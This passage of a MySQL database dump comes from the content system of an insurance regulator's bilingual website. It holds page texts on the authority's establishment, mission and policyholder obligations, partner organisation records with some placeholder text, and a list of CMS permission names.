matters relating to insurance in the United Republic. The Authority shall be a body corporate with perpetual succession and a common seal and shall, in its corporate name, be:-</p>','<h2><strong>Who We Are?</strong></h2>\r\n\r\n<p>Enhancing provision of sustainable and regulated Insurance services to Public and Private Institutions</p>\r\n\r\n<p>The Authority is established under the the Insurance Act No.10 of 2009 as Follows. There is established a body to be known as the Tanzania Insurance Regulatory Authority. Subject to the general supervision of the Minister,the Authority shall be charged with the responsibility of coordinating policy and other matters relating to insurance in the United Republic. The Authority shall be a body corporate with perpetual succession and a common seal and shall, in its corporate name, be:-</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Enhancing compliance to policies, laws, regulations, standards, and guidelines related to Insurance and Licensing initiatives in Public and Private Institutions</p>\r\n\r\n<p>The Authority is established under the the Insurance Act No.10 of 2009 as Follows. There is established a body to be known as the Tanzania Insurance Regulatory Authority. Subject to the general supervision of the Minister,the Authority shall be charged with the responsibility of coordinating policy and other matters relating to insurance in the United Republic. The Authority shall be a body corporate with perpetual succession and a common seal and shall, in its corporate name, be:-</p>','who-we-are',1,'2022-08-09 14:50:33','2022-08-09 14:50:33'),(9,'Tunamuhudumia Nani','Who we Serve',0,'<h2><strong>Who We Serve?</strong></h2>\r\n\r\n<p>Enhancing provision of sustainable and regulated Insurance services to Public and Private Institutions</p>\r\n\r\n<p>The Authority is established under the the Insurance Act No.10 of 2009 as Follows. There is established a body to be known as the Tanzania Insurance Regulatory Authority. Subject to the general supervision of the Minister,the Authority shall be charged with the responsibility of coordinating policy and other matters relating to insurance in the United Republic. The Authority shall be a body corporate with perpetual succession and a common seal and shall, in its corporate name, be:-</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Enhancing compliance to policies, laws, regulations, standards, and guidelines related to Insurance and Licensing initiatives in Public and Private Institutions</p>\r\n\r\n<p>The Authority is established under the the Insurance Act No.10 of 2009 as Follows. There is established a body to be known as the Tanzania Insurance Regulatory Authority. Subject to the general supervision of the Minister,the Authority shall be charged with the responsibility of coordinating policy and other matters relating to insurance in the United Republic. The Authority shall be a body corporate with perpetual succession and a common seal and shall, in its corporate name, be:-</p>','<h2><strong>Who We Serve?</strong></h2>\r\n\r\n<p>Enhancing provision of sustainable and regulated Insurance services to Public and Private Institutions</p>\r\n\r\n<p>The Authority is established under the the Insurance Act No.10 of 2009 as Follows. There is established a body to be known as the Tanzania Insurance Regulatory Authority. Subject to the general supervision of the Minister,the Authority shall be charged with the responsibility of coordinating policy and other matters relating to insurance in the United Republic. The Authority shall be a body corporate with perpetual succession and a common seal and shall, in its corporate name, be:-</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Enhancing compliance to policies, laws, regulations, standards, and guidelines related to Insurance and Licensing initiatives in Public and Private Institutions</p>\r\n\r\n<p>The Authority is established under the the Insurance Act No.10 of 2009 as Follows. There is established a body to be known as the Tanzania Insurance Regulatory Authority. Subject to the general supervision of the Minister,the Authority shall be charged with the responsibility of coordinating policy and other matters relating to insurance in the United Republic. The Authority shall be a body corporate with perpetual succession and a common seal and shall, in its corporate name, be:-</p>','who-we-serve',1,'2022-08-09 14:52:41','2022-08-09 14:52:41'),(10,'Dhamira na Maono','Mission and Vision',0,'<h2>&nbsp;</h2>\r\n\r\n<p><strong>Our Mission:</strong></p>\r\n\r\n<p>&quot;To develop, promote and maintain an inclusive, efficient, fair, safe and stable insurance market for the benefit and protection of policy holders&rdquo;</p>\r\n\r\n<p><strong>Our Vision:</strong></p>\r\n\r\n<p>&quot;A world-class insurance regulator&quot;</p>\r\n\r\n<p><strong>Our Values:</strong></p>\r\n\r\n<p>&quot;Professionalism,&nbsp;Customer Centricity, Team Spirit,&nbsp;Integrity and&nbsp;Accountability &amp; Transparency&nbsp;&quot;</p>','<h2>&nbsp;</h2>\r\n\r\n<p><strong>Our Mission:</strong></p>\r\n\r\n<p>&quot;To develop, promote and maintain an inclusive, efficient, fair, safe and stable insurance market for the benefit and protection of policy holders&rdquo;</p>\r\n\r\n<p><strong>Our Vision:</strong></p>\r\n\r\n<p>&quot;A world-class insurance regulator&quot;</p>\r\n\r\n<p><strong>Our Values:</strong></p>\r\n\r\n<p>&quot;Professionalism,&nbsp;Customer Centricity, Team Spirit,&nbsp;Integrity and&nbsp;Accountability &amp; Transparency&nbsp;&quot;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>','mission-and-vision',1,'2022-08-09 14:54:00','2022-08-12 14:31:14'),(11,'Madhumuni Yetu','Our Objectives',0,'<h2><strong>&nbsp; Objectives of the Authority</strong></h2>\r\n\r\n<ul>\r\n	<li>Specify the code of conduct for members of the insurance industry;</li>\r\n	<li>Effect supervision and monitoring of insurers, brokers and agents;</li>\r\n	<li>Formulate standards in the conduct of the business of insurance which shall be observed by insurers, brokers and agents;</li>\r\n	<li>Ensure proper observance of the code of ethics and practice by insurers, brokers and agents; and</li>\r\n	<li>Perform any other function as may be necessary for the purpose of this Act.</li>\r\n	<li>Protect the interest of policy-holder;</li>\r\n	<li>Specify requisite qualifications for members of the insurance industry;</li>\r\n	<li>Prescribe levies on premiums and commissions to ensure adequate funding for the Authority.</li>\r\n</ul>','<h2 style=\"text-align: justify;\"><strong>&nbsp; &nbsp; Objectives of the Authority</strong></h2>\r\n\r\n<ul>\r\n	<li>Specify the code of conduct for members of the insurance industry;</li>\r\n	<li>Effect supervision and monitoring of insurers, brokers and agents;</li>\r\n	<li>Formulate standards in the conduct of the business of insurance which shall be observed by insurers, brokers and agents;</li>\r\n	<li>Ensure proper observance of the code of ethics and practice by insurers, brokers and agents; and</li>\r\n	<li>Perform any other function as may be necessary for the purpose of this Act.</li>\r\n	<li>Protect the interest of policy-holder;</li>\r\n	<li>Specify requisite qualifications for members of the insurance industry;</li>\r\n	<li>Prescribe levies on premiums and commissions to ensure adequate funding for the Authority.</li>\r\n</ul>','our-objectives',1,'2022-08-09 14:55:18','2022-08-12 14:35:23'),(12,'Research and Statistics','Research and Statistics',0,'<p>orem ipsum dolor sit amet, consectetur adipiscing elit. Sed urna felis, posuere ut augue dictum, hendrerit pharetra lacus. Aenean tellus metus, eleifend at eros at, aliquet vestibulum arcu. Vestibulum elementum, diam quis iaculis consectetur, lorem nulla faucibus ex, condimentum placerat nibh tellus nec quam. Quisque vel magna imperdiet, lacinia ipsum non, venenatis tellus.</p>','<p>orem ipsum dolor sit amet, consectetur adipiscing elit. Sed urna felis, posuere ut augue dictum, hendrerit pharetra lacus. Aenean tellus metus, eleifend at eros at, aliquet vestibulum arcu. Vestibulum elementum, diam quis iaculis consectetur, lorem nulla faucibus ex, condimentum placerat nibh tellus nec quam. Quisque vel magna imperdiet, lacinia ipsum non, venenatis tellus.</p>','research-and-statistics',1,'2022-08-09 16:52:04','2022-08-09 16:52:04'),(13,'Corporate Social Responsibility','Corporate Social Responsibility',1,'<p>Corporate Social Responsibility</p>','<p>Corporate Social Responsibility</p>','corporate-social-responsibility',1,'2022-08-10 05:18:16','2022-08-10 05:18:16'),(14,'Roles of Policy Holders','Roles of Policy Holders',0,'<p>.</p>\r\n\r\n<ol>\r\n	<li><strong>Obligation to own and sign the &nbsp;Contract:&nbsp;</strong>The policyholder&#39;s obligation to read, understand and sign the contract is fundamental to the contract of insurance. After signing the contract, the insured is required to take one copy for reference.</li>\r\n	<li><strong>Obligation To Pay Premiums:</strong>The policyholder&#39;s obligation to pay policy premiums is fundamental to the contract of insurance.</li>\r\n	<li><strong>Requirement Of Notice Of Loss:&nbsp;</strong>The purpose of an insurance policy provision requiring a timely notice of loss is not merely to inform the insurer that the accident has in fact occurred. Rather, it also provides the insurer with an opportunity to investigate the claim and determine its rights and liabilities in the action. Policyholder must therefore give timely notice of a loss or claim by providing sufficient information to appraise the insurer of the nature of the loss or claim.</li>\r\n	<li><strong>Notice Of Loss And Proof Of Loss:&nbsp;</strong>Written notice of injury or of sickness upon which claim may be based must be given to the company after the occurrence or commencement of any loss for which benefit arising out of each such injury or sickness may be claimed, or as soon thereafter as is reasonably possible.</li>\r\n	<li><strong>Requirement Of Cooperation By The Insured Liability:&nbsp;</strong>Insurance policies generally contain clauses requiring the insured to cooperate with the insurer in the conduct of the action by assisting settlement efforts, attending hearings and trials, and securing and giving needed evidence.</li>\r\n	<li><strong>Misstatements By The Insured (Application honesty):&nbsp;</strong>Misstatements or misrepresentation can void a policy, especially if company can show it would not have issued policy if it had known the facts.</li>\r\n	<li><strong>Keep down exposure to risk:</strong>&nbsp;If insurance companies discover you&rsquo;ve been behaving recklessly, in a way that could increase your chances of a claim, they&rsquo;ll consider discontinuing your insurance coverage.</li>\r\n	<li><strong>Collusion between the insured and claimant:</strong>Every insurer has at some point faced a situation in which it knows or suspects that its insured has collaborated with a third-party claimant in order to influence the availability of insurance coverage for the claims against it.</li>\r\n	<li><strong>Keep your information current:</strong>&nbsp;If you move, change your beneficiaries, or you no longer own the property that you had insured, make sure you let your insurance provider know.</li>\r\n</ol>','<p>.</p>\r\n\r\n<ol>\r\n	<li><strong>Obligation to own and sign the &nbsp;Contract:&nbsp;</strong>The policyholder&#39;s obligation to read, understand and sign the contract is fundamental to the contract of insurance. After signing the contract, the insured is required to take one copy for reference.</li>\r\n	<li><strong>Obligation To Pay Premiums:</strong>The policyholder&#39;s obligation to pay policy premiums is fundamental to the contract of insurance.</li>\r\n	<li><strong>Requirement Of Notice Of Loss:&nbsp;</strong>The purpose of an insurance policy provision requiring a timely notice of loss is not merely to inform the insurer that the accident has in fact occurred. Rather, it also provides the insurer with an opportunity to investigate the claim and determine its rights and liabilities in the action. Policyholder must therefore give timely notice of a loss or claim by providing sufficient information to appraise the insurer of the nature of the loss or claim.</li>\r\n	<li><strong>Notice Of Loss And Proof Of Loss:&nbsp;</strong>Written notice of injury or of sickness upon which claim may be based must be given to the company after the occurrence or commencement of any loss for which benefit arising out of each such injury or sickness may be claimed, or as soon thereafter as is reasonably possible.</li>\r\n	<li><strong>Requirement Of Cooperation By The Insured Liability:&nbsp;</strong>Insurance policies generally contain clauses requiring the insured to cooperate with the insurer in the conduct of the action by assisting settlement efforts, attending hearings and trials, and securing and giving needed evidence.</li>\r\n	<li><strong>Misstatements By The Insured (Application honesty):&nbsp;</strong>Misstatements or misrepresentation can void a policy, especially if company can show it would not have issued policy if it had known the facts.</li>\r\n	<li><strong>Keep down exposure to risk:</strong>&nbsp;If insurance companies discover you&rsquo;ve been behaving recklessly, in a way that could increase your chances of a claim, they&rsquo;ll consider discontinuing your insurance coverage.</li>\r\n	<li><strong>Collusion between the insured and claimant:</strong>Every insurer has at some point faced a situation in which it knows or suspects that its insured has collaborated with a third-party claimant in order to influence the availability of insurance coverage for the claims against it.</li>\r\n	<li><strong>Keep your information current:</strong>&nbsp;If you move, change your beneficiaries, or you no longer own the property that you had insured, make sure you let your insurance provider know.</li>\r\n</ol>','roles-of-policy-holders',1,'2022-08-10 14:06:32','2022-08-12 15:45:10'),(15,'TIRA Establishment','TIRA Establishment',0,'<p>The&nbsp; Authority is established under the the Insurance Act No.10 of 2009 as Follows:-</p>\r\n\r\n<ul>\r\n	<li>There is established a body to be known as the Tanzania Insurance Regulatory Authority.</li>\r\n	<li>Subject to the general supervision of the Minister,the Authority shall be charged with the responsibility of coordinating policy and other matters relating to insurance in the United Republic.</li>\r\n	<li>The&nbsp; Authority shall be a body corporate with perpetual succession and a common seal and shall, in its corporate name, be:-<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (a) Capable of suing and being sued;<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (b) Capable of borrowing money,acquiring and disposing of property ;and<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (c) Capable of doing all other things which a body corporate may lawful do.</li>\r\n</ul>','<p>The&nbsp; Authority is established under the the Insurance Act No.10 of 2009 as Follows:-</p>\r\n\r\n<ul>\r\n	<li>There is established a body to be known as the Tanzania Insurance Regulatory Authority.</li>\r\n	<li>Subject to the general supervision of the Minister,the Authority shall be charged with the responsibility of coordinating policy and other matters relating to insurance in the United Republic.</li>\r\n	<li>The&nbsp; Authority shall be a body corporate with perpetual succession and a common seal and shall, in its corporate name, be:-<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (a) Capable of suing and being sued;<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (b) Capable of borrowing money,acquiring and disposing of property ;and<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (c) Capable of doing all other things which a body corporate may lawful do.</li>\r\n</ul>','tira-establishment',1,'2022-08-10 14:13:46','2022-08-12 15:01:04'),(16,'Organization Structure','Organization Structure',1,'<p>Organization Structure</p>','<p>Organization Structure</p>','organization-structure',1,'2022-08-10 14:14:26','2022-08-10 14:14:26');
/*!40000 ALTER TABLE `pages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `partners`
--

DROP TABLE IF EXISTS `partners`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `partners` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_en` text COLLATE utf8mb4_unicode_ci,
  `content_sw` text COLLATE utf8mb4_unicode_ci,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `user_id` int(11) NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `position` int(4) NOT NULL DEFAULT '1',
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `partners`
--

LOCK TABLES `partners` WRITE;
/*!40000 ALTER TABLE `partners` DISABLE KEYS */;
INSERT INTO `partners` VALUES (3,'Africa Insurance Organization','Africa Insurance Organization','',NULL,'<p>Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;</p>','<p>Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;</p>',1,1,'changes-in-second-stakeholders-general-meeting-2','https://www.african-insurance.org/',3,'3bc39e0c007abc15fee31123e41b04bf','2021-09-02 02:58:21','2022-08-13 15:35:28'),(4,'Africa Trade Insurance Agency','Africa Trade Insurance Agency','',NULL,'<p>Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;</p>','<p>Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;</p>',1,1,'changes-in-second-stakeholders-general-meeting-3','https://www.ati-aca.org/',2,'1b90136132b3ecf810461a14dd205796','2022-01-02 02:58:21','2022-08-13 15:27:37'),(5,'Organization of Eastern and Southern Africa Insurers','Organization of Eastern and Southern Africa Insurers','',NULL,'<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec mollis consequat cursus. Nam id justo non turpis gravida dapibus. Cras a facilisis odio, quis accumsan diam. Sed sem neque, pharetra sit amet iaculis et, ullamcorper et risus. Morbi blandit nibh risus, et dignissim dui iaculis sit amet. In convallis lectus vitae tellus malesuada sodales. Sed iaculis aliquam magna at dictum. Aenean pharetra ligula massa, vel fermentum elit elementum pharetra. Integer et viverra purus. Donec molestie ante molestie fringilla scelerisque.</p>\r\n\r\n<p>Donec auctor, enim eleifend fermentum commodo, nisl eros malesuada lorem, eu suscipit ex est vitae lacus. Nullam euismod velit at velit mattis, vel mattis augue fringilla. Nam scelerisque eu quam varius gravida. Sed in ultrices justo, id tristique magna. Maecenas aliquet accumsan volutpat. Quisque commodo nisi at tortor rutrum consectetur. Nunc euismod, turpis ut rhoncus egestas, augue erat eleifend justo, nec vulputate sapien nisi non risus. Nullam eleifend placerat lorem, non vulputate tortor bibendum sed. Duis quis pharetra urna. Ut condimentum, ligula ut auctor malesuada, mi nulla efficitur velit, et eleifend neque mauris nec odio. Mauris a nunc felis. Cras quis leo dictum, rutrum nibh non, venenatis odio. Nam porttitor eros sed ipsum cursus, vitae pellentesque leo feugiat. Morbi magna leo, vehicula sed nisl eget, faucibus sollicitudin erat.</p>','<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec mollis consequat cursus. Nam id justo non turpis gravida dapibus. Cras a facilisis odio, quis accumsan diam. Sed sem neque, pharetra sit amet iaculis et, ullamcorper et risus. Morbi blandit nibh risus, et dignissim dui iaculis sit amet. In convallis lectus vitae tellus malesuada sodales. Sed iaculis aliquam magna at dictum. Aenean pharetra ligula massa, vel fermentum elit elementum pharetra. Integer et viverra purus. Donec molestie ante molestie fringilla scelerisque.</p>\r\n\r\n<p>Donec auctor, enim eleifend fermentum commodo, nisl eros malesuada lorem, eu suscipit ex est vitae lacus. Nullam euismod velit at velit mattis, vel mattis augue fringilla. Nam scelerisque eu quam varius gravida. Sed in ultrices justo, id tristique magna. Maecenas aliquet accumsan volutpat. Quisque commodo nisi at tortor rutrum consectetur. Nunc euismod, turpis ut rhoncus egestas, augue erat eleifend justo, nec vulputate sapien nisi non risus. Nullam eleifend placerat lorem, non vulputate tortor bibendum sed. Duis quis pharetra urna. Ut condimentum, ligula ut auctor malesuada, mi nulla efficitur velit, et eleifend neque mauris nec odio. Mauris a nunc felis. Cras quis leo dictum, rutrum nibh non, venenatis odio. Nam porttitor eros sed ipsum cursus, vitae pellentesque leo feugiat. Morbi magna leo, vehicula sed nisl eget, faucibus sollicitudin erat.</p>',1,1,'lorem-ipsum-dolor-sit-amet-consectetur-adipiscing-elit-donec-mollis-consequat','https://uia.org/s/or/en/1100057366',-16,'01a6bacbb9eab486c352274fa28dbe23','2022-01-08 13:30:30','2022-08-13 16:35:40');
/*!40000 ALTER TABLE `partners` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `password_resets`
--

DROP TABLE IF EXISTS `password_resets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `password_resets` (
  `email` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  KEY `password_resets_email_index` (`email`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `password_resets`
--

LOCK TABLES `password_resets` WRITE;
/*!40000 ALTER TABLE `password_resets` DISABLE KEYS */;
/*!40000 ALTER TABLE `password_resets` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `permissions`
--

DROP TABLE IF EXISTS `permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `permissions` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `guard_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=403 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `permissions`
--

LOCK TABLES `permissions` WRITE;
/*!40000 ALTER TABLE `permissions` DISABLE KEYS */;
INSERT INTO `permissions` VALUES (1,'cms.cms.dashboard.view-dashboard','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(2,'cms.backgrounds.index','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(3,'cms.backgrounds.create','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(4,'cms.backgrounds.store','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(5,'cms.backgrounds.show','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(6,'cms.backgrounds.edit','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(7,'cms.backgrounds.update','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(8,'cms.backgrounds.destroy','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(9,'cms.services.index','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(10,'cms.services.create','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(11,'cms.services.store','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(12,'cms.services.show','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(13,'cms.services.edit','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(14,'cms.services.update','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(15,'cms.services.destroy','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(16,'cms.seo.index','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(17,'cms.seo.create','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(18,'cms.seo.store','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(19,'cms.seo.show','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(20,'cms.seo.edit','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(21,'cms.seo.update','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(22,'cms.seo.destroy','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(23,'cms.preferences.index','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(24,'cms.preferences.create','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(25,'cms.preferences.store','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(26,'cms.preferences.show','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(27,'cms.preferences.edit','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(28,'cms.preferences.update','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(29,'cms.preferences.destroy','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(30,'cms.faqs.index','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(31,'cms.faqs.create','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(32,'cms.faqs.store','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(33,'cms.faqs.show','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(34,'cms.faqs.edit','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(35,'cms.faqs.update','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(36,'cms.faqs.destroy','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(37,'cms.news.index','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(38,'cms.news.create','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(39,'cms.news.store','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(40,'cms.news.show','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(41,'cms.news.edit','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(42,'cms.news.update','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(43,'cms.news.destroy','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(44,'cms.events.index','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(45,'cms.events.create','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(46,'cms.events.store','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(47,'cms.events.show','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(48,'cms.events.edit','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(49,'cms.events.update','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(50,'cms.events.destroy','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(51,'cms.regional_office.index','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(52,'cms.regional_office.create','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(53,'cms.regional_office.store','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(54,'cms.regional_office.show','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(55,'cms.regional_office.edit','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(56,'cms.regional_office.update','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(57,'cms.regional_office.destroy','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(58,'cms.complaints.index','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(59,'cms.complaints.create','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(60,'cms.complaints.store','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(61,'cms.complaints.show','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(62,'cms.complaints.edit','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(63,'cms.complaints.update','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(64,'cms.complaints.destroy','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(65,'cms.related_links.index','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(66,'cms.related_links.create','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(67,'cms.related_links.store','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(68,'cms.related_links.show','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(69,'cms.related_links.edit','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(70,'cms.related_links.update','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(71,'cms.related_links.destroy','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(72,'cms.social_links.index','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(73,'cms.social_links.create','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(74,'cms.social_links.store','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(75,'cms.social_links.show','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(76,'cms.social_links.edit','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(77,'cms.social_links.update','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(78,'cms.social_links.destroy','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(79,'cms.about_links.index','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(80,'cms.about_links.create','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(81,'cms.about_links.store','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(82,'cms.about_links.show','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(83,'cms.about_links.edit','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(84,'cms.about_links.update','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(85,'cms.about_links.destroy','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(86,'cms.support_links.index','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(87,'cms.support_links.create','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(88,'cms.support_links.store','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(89,'cms.support_links.show','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(90,'cms.support_links.edit','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(91,'cms.support_links.update','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(92,'cms.support_links.destroy','web','2022-03-11 04:11:10','2022-03-11 